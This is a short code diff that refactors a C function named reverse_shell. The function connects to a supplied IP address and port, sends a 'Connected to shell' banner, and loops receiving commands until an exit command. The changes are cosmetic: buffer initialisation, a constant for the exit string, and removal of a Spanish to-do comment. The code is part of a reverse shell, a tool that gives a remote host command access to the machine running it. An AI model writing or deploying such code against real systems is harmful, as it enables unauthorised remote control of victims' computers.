@@ -13,8 +13,8 @@ int reverse_shell(char *ip_addr, int port)
 {
 	int socket_desc;
 	struct sockaddr_in server;
-	char command[1024];
-	char welcome_message[1024];
+	char command[1024] = {0};
+	char *welcome_message = "Connected to shell\n$ ";
 	char *command_output = NULL;
 
 	socket_desc = socket(AF_INET, SOCK_STREAM, 0);
@@ -32,14 +32,12 @@ int reverse_shell(char *ip_addr, int port)
 		return ERROR;
 	}
 
-	// Hay que sacar el send para que el codigo se quede mas limpio por aqui (a lo mejor el recv no hace falta por ahora)
-	strcpy(welcome_message, "Connected to shell\n$ ");
 	if (send(socket_desc, welcome_message, strlen(welcome_message), 0) == ERROR) {
 		printf("Error sending output of command\n");
 		return ERROR;
 	}
 
-	while (strcmp(command, "exit\n") != 0)
+	while (strcmp(command, EXIT_COMMAND) != 0)
 	{
 		if (recv(socket_desc, command, 1024, 0) == ERROR) {
 		 	printf("Error receiving command\n");
